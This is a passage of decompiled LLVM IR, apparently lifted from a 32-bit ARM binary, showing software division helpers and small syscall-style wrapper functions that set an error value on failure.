  %v1_108e0 = phi i32 [ %v1_108d4, %dec_label_pc_108cc ], [ %v3_108d4, %bb84 ]
  %v4_108d8 = udiv i32 %v1_10904, 2
  %v6_108d8 = icmp ult i32 %v1_108dc, %v4_108d8
  br i1 %v6_108d8, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_108dc = urem i32 %v1_10904, 2
  %v4_108dc = icmp eq i32 %v3_108dc, 0
  %v6_108dc = sub i32 %v1_108dc, %v4_108d8
  br i1 %v4_108dc, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_108e0 = udiv i32 %v1_10900, 2
  %v6_108e0 = or i32 %v1_108e0, %v5_108e0
  store i32 %v6_108e0, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_108e8 = phi i32 [ %v6_108dc, %bb85 ], [ %v1_108dc, %.thread7 ], [ %v6_108dc, %bb86 ]
  %v1_108ec = phi i32 [ %v1_108e0, %bb85 ], [ %v1_108e0, %.thread7 ], [ %v6_108e0, %bb86 ]
  %v4_108e4 = udiv i32 %v1_10904, 4
  %v6_108e4 = icmp ult i32 %v1_108e8, %v4_108e4
  br i1 %v6_108e4, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_108e8 = and i32 %v1_10904, 2
  %v4_108e8 = icmp eq i32 %v3_108e8, 0
  %v6_108e8 = sub i32 %v1_108e8, %v4_108e4
  br i1 %v4_108e8, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_108ec = udiv i32 %v1_10900, 4
  %v6_108ec = or i32 %v1_108ec, %v5_108ec
  store i32 %v6_108ec, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_108f4 = phi i32 [ %v6_108e8, %bb87 ], [ %v1_108e8, %.thread8 ], [ %v6_108e8, %bb88 ]
  %v1_108f8 = phi i32 [ %v1_108ec, %bb87 ], [ %v1_108ec, %.thread8 ], [ %v6_108ec, %bb88 ]
  %v4_108f0 = udiv i32 %v1_10904, 8
  %v6_108f0 = icmp ult i32 %v1_108f4, %v4_108f0
  br i1 %v6_108f0, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_108f4 = and i32 %v1_10904, 4
  %v4_108f4 = icmp eq i32 %v3_108f4, 0
  %v6_108f4 = sub i32 %v1_108f4, %v4_108f0
  br i1 %v4_108f4, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_108f8 = udiv i32 %v1_10900, 8
  %v6_108f8 = or i32 %v1_108f8, %v5_108f8
  store i32 %v6_108f8, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_1090c = phi i32 [ %v1_108f8, %bb89 ], [ %v1_108f8, %.thread9 ], [ %v6_108f8, %bb90 ]
  %v0_108fc = phi i32 [ %v6_108f4, %bb89 ], [ %v1_108f4, %.thread9 ], [ %v6_108f4, %bb90 ]
  %v2_108fc = icmp eq i32 %v0_108fc, 0
  br i1 %v2_108fc, label %dec_label_pc_1090c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10900, 16
  br i1 %tmp138, label %dec_label_pc_1090c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10900 = udiv i32 %v1_10900, 16
  %v4_10904 = udiv i32 %v1_10904, 16
  br label %dec_label_pc_108cc

dec_label_pc_1090c:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_1090c

dec_label_pc_10914:                               ; preds = %dec_label_pc_10880
  %v9_10880 = icmp eq i32 %v0_10880, %v1_10880
  %. = zext i1 %v9_10880 to i32
  ret i32 %.

dec_label_pc_10920:                               ; preds = %dec_label_pc_10888
  %v2_10920 = icmp ugt i32 %v1_10880, 65535
  br i1 %v2_10920, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10920
  %v2_10924 = and i32 %v1_10880, 32768
  %v3_10924 = icmp eq i32 %v2_10924, 0
  %v4_10924 = udiv i32 %v1_10880, 65536
  br i1 %v3_10924, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10920
  %v0_1093065 = phi i32 [ %v1_10880, %dec_label_pc_10920 ], [ %v4_10924, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_10934 = phi i32 [ %v0_1093065, %.thread16 ], [ %v4_10924, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10930 = icmp ugt i32 %v1_10934, 255
  br i1 %v2_10930, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_10934 = and i32 %v1_10934, 128
  %v3_10934 = icmp eq i32 %v2_10934, 0
  %v4_10934 = udiv i32 %v1_10934, 256
  br i1 %v3_10934, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10938 = or i32 %storemerge, 8
  store i32 %v2_10938, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_10944 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10938, %bb98 ]
  %v1_10940 = phi i32 [ %v1_10934, %bb96 ], [ %v4_10934, %bb97 ], [ %v4_10934, %bb98 ]
  %v2_1093c = icmp ugt i32 %v1_10940, 15
  br i1 %v2_1093c, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10940 = and i32 %v1_10940, 8
  %v3_10940 = icmp eq i32 %v2_10940, 0
  %v4_10940 = udiv i32 %v1_10940, 16
  br i1 %v3_10940, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_10944 = add nsw i32 %v1_10944, 4
  store i32 %v2_10944, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_1094c = phi i32 [ %v1_10944, %.thread17 ], [ %v1_10944, %bb99 ], [ %v2_10944, %bb100 ]
  %v5_10950 = phi i32 [ %v1_10940, %.thread17 ], [ %v4_10940, %bb99 ], [ %v4_10940, %bb100 ]
  %v2_10948 = icmp ugt i32 %v5_10950, 3
  %v7_10948 = icmp eq i32 %v5_10950, 4
  %v2_1094c = xor i1 %v7_10948, true
  %v3_1094c = and i1 %v2_10948, %v2_1094c
  br i1 %v3_1094c, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_1094c = add nsw i32 %v4_1094c, 3
  store i32 %v5_1094c, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10950 = phi i32 [ %v4_1094c, %.thread18 ], [ %v5_1094c, %bb101 ]
  %v2_10950 = xor i1 %v2_10948, true
  %v3_10950 = or i1 %v7_10948, %v2_10950
  br i1 %v3_10950, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10950 = udiv i32 %v5_10950, 2
  %v9_10950 = add i32 %v4_10950, %v8_10950
  store i32 %v9_10950, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_10954 = phi i32 [ %v4_10950, %bb102 ], [ %v9_10950, %bb103 ]
  %v6_10954 = lshr i32 %v0_10880, %v1_10954
  ret i32 %v6_10954

dec_label_pc_1095c:                               ; preds = %dec_label_pc_10874
  %v0_1095c = load i32, i32* @lr, align 4
  %v0_10960 = call i32 @function_10988()
  store i32 %v0_1095c, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10950, { 1, 0 }
  uselistorder i1 %v7_10948, { 1, 0 }
  uselistorder i32 %v4_10940, { 1, 0 }
  uselistorder i32 %v1_10940, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10938, { 1, 0 }
  uselistorder i32 %v4_10934, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10934, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10924, { 1, 0 }
  uselistorder i32 %v0_108fc, { 1, 0 }
  uselistorder i32 %v4_108f0, { 1, 0 }
  uselistorder i32 %v1_108f8, { 1, 2, 0 }
  uselistorder i32 %v4_108e4, { 1, 0 }
  uselistorder i32 %v1_108ec, { 1, 2, 0 }
  uselistorder i32 %v4_108d8, { 1, 0 }
  uselistorder i32 %v1_108e0, { 1, 2, 0 }
  uselistorder i32 %v1_10904, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_108d4, { 1, 0 }
  uselistorder i32 %v1_10900, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_108c0, { 1, 0 }
  uselistorder i32 %v3_108bc, { 1, 0 }
  uselistorder i32 %v1_108bc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_108c0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_108ac, { 1, 0 }
  uselistorder i32 %v4_108a8, { 2, 1, 0 }
  uselistorder i32 %v1_108ac, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_108b4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_10880, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_10880, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_10874, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_1090c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_108c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108b4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_10970(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10970:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_10974 = call i32 @function_10874()
  ret i32 %v0_10974
}

define i32 @function_10988() local_unnamed_addr {
dec_label_pc_10988:
  %v1_10990 = call i32 @function_1161c(i32 8)
  ret i32 %v1_10990
}

define i32 @function_1099c() local_unnamed_addr {
dec_label_pc_1099c:
  %v1_109ac = load i32, i32* @r0, align 4
  ret i32 %v1_109ac
}

define i32 @function_109b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_109b0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109b0 = load i32, i32* @r7, align 4
  store i32 %v3_109b0, i32* %stack_var_-8, align 4
  %v0_109bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_109bc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_109bc, -4095
  br i1 %tmp, label %dec_label_pc_109dc, label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109b0
  %v0_109cc = call i32 @function_11200()
  %v0_109d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_109d0 = sub i32 0, %v0_109d0
  %v2_109d4 = inttoptr i32 %v0_109cc to i32*
  store i32 %v1_109d0, i32* %v2_109d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_109dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109b0, %dec_label_pc_109cc
  %v1_109e0 = phi i32 [ %v0_109bc, %dec_label_pc_109b0 ], [ -1, %dec_label_pc_109cc ]
  %v2_109dc = phi i32 [ %v3_109b0, %dec_label_pc_109b0 ], [ %v2_109dc.pre, %dec_label_pc_109cc ]
  store i32 %v2_109dc, i32* @r7, align 4
  ret i32 %v1_109e0

; uselistorder directives
  uselistorder i32 %v0_109bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_109dc, { 1, 0 }
}

define i32 @function_109e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_109e4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_109e4 = load i32, i32* @r2, align 4
  %v9_109e4 = load i32, i32* @r3, align 4
  store i32 %v9_109e4, i32* %stack_var_-4, align 4
  %v1_109f4 = and i32 %arg2, 64
  %v2_109f4 = icmp eq i32 %v1_109f4, 0
  br i1 %v2_109f4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_109e4
  %v3_109fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_109fc, i32* @r3, align 4
  %phitmp = urem i32 %v6_109e4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_109e4, %bb
  %v0_10a00 = phi i32 [ 0, %dec_label_pc_109e4 ], [ %phitmp, %bb ]
  store i32 %v0_10a00, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10a30, label %dec_label_pc_10a20

dec_label_pc_10a20:                               ; preds = %.thread
  %v0_10a20 = call i32 @function_11200()
  %v0_10a24 = load i32, i32* %r7.global-to-local, align 4
  %v1_10a24 = sub i32 0, %v0_10a24
  store i32 %v1_10a24, i32* @r3, align 4
  %v2_10a28 = inttoptr i32 %v0_10a20 to i32*
  store i32 %v1_10a24, i32* %v2_10a28, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a30

dec_label_pc_10a30:                               ; preds = %.thread, %dec_label_pc_10a20
  %v0_10a30 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_10a20 ]
  ret i32 %v0_10a30

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10a30, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10a44() local_unnamed_addr {
dec_label_pc_10a44:
  %v1_10a54 = load i32, i32* @r0, align 4
  ret i32 %v1_10a54
}

define i32 @function_10a58(i32* %arg1) local_unnamed_addr {
dec_label_pc_10a58:
  %stack_var_-16 = alloca i32, align 4
  %v2_10a5c = ptrtoint i32* %stack_var_-16 to i32
  %v2_10a6c = call i32 @function_10bd8(i32 %v2_10a5c, i32 0)
  %v2_10a70 = load i32, i32* %stack_var_-16, align 4
  %v2_10a74 = icmp eq i32* %arg1, null
  br i1 %v2_10a74, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_10a58
  store i32 %v2_10a70, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_10a58, %bb
  ret i32 %v2_10a70

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_10a88(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10a88:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10abc, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10a88
  %v0_10aac = call i32 @function_11200()
  %v0_10ab0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10ab0 = sub i32 0, %v0_10ab0
  %v2_10ab4 = inttoptr i32 %v0_10aac to i32*
  store i32 %v1_10ab0, i32* %v2_10ab4, align 4
  br label %dec_label_pc_10abc

dec_label_pc_10abc:                               ; preds = %dec_label_pc_10a88, %dec_label_pc_10aac
  %v1_10ac4 = phi i32 [ %arg1, %dec_label_pc_10a88 ], [ -1, %dec_label_pc_10aac ]
  ret i32 %v1_10ac4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10abc, { 1, 0 }
}

define i32 @function_10ac8() local_unnamed_addr {
dec_label_pc_10ac8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ac8 = load i32, i32* @r7, align 4
  store i32 %v3_10ac8, i32* %stack_var_-8, align 4
  %v0_10ad4 = load i32, i32* @r0, align 4
  store i32 %v0_10ad4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10ad4, -4095
  br i1 %tmp, label %dec_label_pc_10af4, label %dec_label_pc_10ae4

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10ac8
  %v0_10ae4 = call i32 @function_11200()
  %v0_10ae8 = load i32, i32* %r7.global-to-local, align 4
  %v1_10ae8 = sub i32 0, %v0_10ae8
  %v2_10aec = inttoptr i32 %v0_10ae4 to i32*
  store i32 %v1_10ae8, i32* %v2_10aec, align 4
  %v2_10af4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10ac8, %dec_label_pc_10ae4
  %v1_10af8 = phi i32 [ %v0_10ad4, %dec_label_pc_10ac8 ], [ -1, %dec_label_pc_10ae4 ]
  %v2_10af4 = phi i32 [ %v3_10ac8, %dec_label_pc_10ac8 ], [ %v2_10af4.pre, %dec_label_pc_10ae4 ]
  store i32 %v2_10af4, i32* @r7, align 4
  ret i32 %v1_10af8

; uselistorder directives
  uselistorder i32 %v0_10ad4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10af4, { 1, 0 }
}

define i32 @function_10afc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10afc:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10b2c, label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10afc
  %v0_10b1c = call i32 @function_11200()
  %v0_10b20 = load i32, i32* %r4.global-to-local, align 4
  %v1_10b20 = sub i32 0, %v0_10b20
  %v2_10b24 = inttoptr i32 %v0_10b1c to i32*
  store i32 %v1_10b20, i32* %v2_10b24, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10b2c

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_10afc, %dec_label_pc_10b1c
  %v0_10b2c = phi i32 [ %arg1, %dec_label_pc_10afc ], [ -1, %dec_label_pc_10b1c ]
  ret i32 %v0_10b2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10b2c, { 1, 0 }
}

define i32 @function_10b3c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10b3c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b3c = load i32, i32* @r7, align 4
  store i32 %v3_10b3c, i32* %stack_var_-8, align 4
  %v0_10b48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b48, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10b48, -4095
  br i1 %tmp, label %dec_label_pc_10b68, label %dec_label_pc_10b58

dec_label_pc_10b58:                               ; preds = %dec_label_pc_10b3c
  %v0_10b58 = call i32 @function_11200()
  %v0_10b5c = load i32, i32* %r7.global-to-local, align 4
  %v1_10b5c = sub i32 0, %v0_10b5c
  store i32 %v1_10b5c, i32* @r3, align 4
  %v2_10b60 = inttoptr i32 %v0_10b58 to i32*
  store i32 %v1_10b5c, i32* %v2_10b60, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10b68.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10b68

dec_label_pc_10b68:                               ; preds = %dec_label_pc_10b3c, %dec_label_pc_10b58
  %v1_10b6c = phi i32 [ %v0_10b48, %dec_label_pc_10b3c ], [ -1, %dec_label_pc_10b58 ]
  %v2_10b68 = phi i32 [ %v3_10b3c, %dec_label_pc_10b3c ], [ %v2_10b68.pre, %dec_label_pc_10b58 ]
  store i32 %v2_10b68, i32* @r7, align 4
  ret i32 %v1_10b6c

; uselistorder directives
  uselistorder i32 %v0_10b48, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b68, { 1, 0 }
}

define i32 @function_10b70(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b70:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10b70 = load i32, i32* @r7, align 4
  store i32 %v3_10b70, i32* %stack_var_-8, align 4
  %v0_10b7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10b7c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10b7c, -4095
  br i1 %tmp, label %dec_label_pc_10b9c, label %dec_label_pc_10b8c

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10b70
  %v0_10b8c = call i32 @function_11200()
  %v0_10b90 = load i32, i32* %r7.global-to-local, align 4
  %v1_10b90 = sub i32 0, %v0_10b90
  %v2_10b94 = inttoptr i32 %v0_10b8c to i32*
  store i32 %v1_10b90, i32* %v2_10b94, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10b9c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10b9c

dec_label_pc_10b9c:                               ; preds = %dec_label_pc_10b70, %dec_label_pc_10b8c
  %v1_10ba0 = phi i32 [ %v0_10b7c, %dec_label_pc_10b70 ], [ -1, %dec_label_pc_10b8c ]
  %v2_10b9c = phi i32 [ %v3_10b70, %dec_label_pc_10b70 ], [ %v2_10b9c.pre, %dec_label_pc_10b8c ]
  store i32 %v2_10b9c, i32* @r7, align 4
  ret i32 %v1_10ba0

; uselistorder directives
  uselistorder i32 %v0_10b7c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b9c, { 1, 0 }
}

define i32 @function_10ba4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10ba4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ba4 = load i32, i32* @r7, align 4
  store i32 %v3_10ba4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10bcc, label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10ba4
  %v0_10bbc = call i32 @function_11200()
  %v0_10bc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_10bc0 = sub i32 0, %v0_10bc0
  %v2_10bc4 = inttoptr i32 %v0_10bbc to i32*
  store i32 %v1_10bc0, i32* %v2_10bc4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10bd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10ba4, %dec_label_pc_10bbc
  %v2_10bd0 = phi i32 [ %v3_10ba4, %dec_label_pc_10ba4 ], [ %v2_10bd0.pre, %dec_label_pc_10bbc ]
  %v0_10bcc = phi i32 [ %arg1, %dec_label_pc_10ba4 ], [ -1, %dec_label_pc_10bbc ]
  store i32 %v2_10bd0, i32* @r7, align 4
  ret i32 %v0_10bcc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10bcc, { 1, 0 }
}

define i32 @function_10bd8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10bd8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10bd8 = load i32, i32* @r7, align 4
  store i32 %v3_10bd8, i32* %stack_var_-8, align 4
  %v0_10be4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10be4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10be4, -4095
  br i1 %tmp, label %dec_label_pc_10c04, label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10bd8
  %v0_10bf4 = call i32 @function_11200()
  %v0_10bf8 = load i32, i32* %r7.global-to-local, align 4
  %v1_10bf8 = sub i32 0, %v0_10bf8
  store i32 %v1_10bf8, i32* @r3, align 4
  %v2_10bfc = inttoptr i32 %v0_10bf4 to i32*
  store i32 %v1_10bf8, i32* %v2_10bfc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c04

dec_label_pc_10c04:                               ; preds = %dec_label_pc_10bd8, %dec_label_pc_10bf4
  %v1_10c08 = phi i32 [ %v0_10be4, %dec_label_pc_10bd8 ], [ -1, %dec_label_pc_10bf4 ]
  %v2_10c04 = phi i32 [ %v3_10bd8, %dec_label_pc_10bd8 ], [ %v2_10c04.pre, %dec_label_pc_10bf4 ]
  store i32 %v2_10c04, i32* @r7, align 4
  ret i32 %v1_10c08

; uselistorder directives
  uselistorder i32 %v0_10be4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c04, { 1, 0 }
}

define i32 @function_10c0c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c0c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10c0c = load i32, i32* @r3, align 4
  store i32 %v9_10c0c, i32* %stack_var_-4, align 4
  %v2_10c24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10c24, i32* @r3, align 4
  %v0_10c48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10c48, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10c48, -4095
  br i1 %tmp, label %dec_label_pc_10c68, label %dec_label_pc_10c58

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c0c
  %v0_10c58 = call i32 @function_11200()
  %v0_10c5c = load i32, i32* %r7.global-to-local, align 4
  %v1_10c5c = sub i32 0, %v0_10c5c
  store i32 %v1_10c5c, i32* @r3, align 4
  %v2_10c60 = inttoptr i32 %v0_10c58 to i32*
  store i32 %v1_10c5c, i32* %v2_10c60, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c68

dec_label_pc_10c68:                               ; preds = %dec_label_pc_10c0c, %dec_label_pc_10c58
  %v1_10c74 = phi i32 [ %v0_10c48, %dec_label_pc_10c0c ], [ -1, %dec_label_pc_10c58 ]
  ret i32 %v1_10c74

; uselistorder directives
  uselistorder i32 %v0_10c48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c68, { 1, 0 }
}

define i32 @function_10c78(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10c78:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_10cb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cb4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cb4, -4095
  br i1 %tmp, label %dec_label_pc_10cd4, label %dec_label_pc_10cc4

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10c78
  %v0_10cc4 = call i32 @function_11200()
  %v0_10cc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_10cc8 = sub i32 0, %v0_10cc8
  %v2_10ccc = inttoptr i32 %v0_10cc4 to i32*
  store i32 %v1_10cc8, i32* %v2_10ccc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10c78, %dec_label_pc_10cc4
  %v1_10ce0 = phi i32 [ %v0_10cb4, %dec_label_pc_10c78 ], [ -1, %dec_label_pc_10cc4 ]
  ret i32 %v1_10ce0

; uselistorder directives
  uselistorder i32 %v0_10cb4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cd4, { 1, 0 }
}

define i32 @function_10ce4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10ce4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ce4 = load i32, i32* @r7, align 4
  store i32 %v3_10ce4, i32* %stack_var_-8, align 4
  %v0_10cf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cf0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cf0, -4095
